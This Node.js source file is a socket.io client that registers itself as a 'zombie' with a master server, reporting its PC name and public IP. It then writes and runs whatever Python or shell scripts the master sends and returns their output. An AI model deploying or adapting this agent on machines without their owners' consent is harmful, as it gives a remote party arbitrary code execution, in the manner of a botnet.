// Node Libraries
const io = require('socket.io-client')
const publicIp = require('public-ip');
const fs = require('fs');
const util = require('util')
const exec =require('child_process').exec
var argv = require('minimist')(process.argv.slice(2));
var path = require('path')

write_file = util.promisify(fs.writeFile)


// Globals
master_socket_server_port = 10002;
const master_url = argv["url"]
const pc_name = argv["pcname"]

const make_execution_cmd = (script_name) =>{
    extension = path.extname(script_name)
    let cmd = ''
    if (extension == ".py"){
        cmd = "python " + script_name
    }else if (extension == ".sh"){
        cmd = "source " + script_name
    }else{
        return "echo \"invalid file extension! \""
    }
    
    return cmd;
}
/*
    Firing up the routines...
*/

const main = async () => {
    const socket = io(master_url);
    
    socket.emit("zombie_info", {
        pc_name: pc_name,
        public_ip: await publicIp.v4()
    });
    socket.on("disconnect", () =>{
        console.log("Pipe broke, restarting...")
        process.exit()
    })


    socket.on("run_script", async (data) =>{
        console.log(data)
        try{
            await write_file(data.script_name, data.script_binary)
            
            let cmd =  make_execution_cmd(data.script_name);
            
            socket.emit("job_status" , {
                message: 'Started on ' +  pc_name
            })


            exec(cmd, (error, stdout, stderr) => {
                
                socket.emit("stdout", {
                    job_id: data.job_id,
                    stdout: stdout
                })

                socket.emit("stderr", {
                    job_id: data.job_id,
                    stderr: stderr
                })

                socket.emit("job_status" ,{
                    message: 'Completed on' +  pc_name
                })
            });


        }catch(err){
            console.log(err)
        }

    })
}






main()



















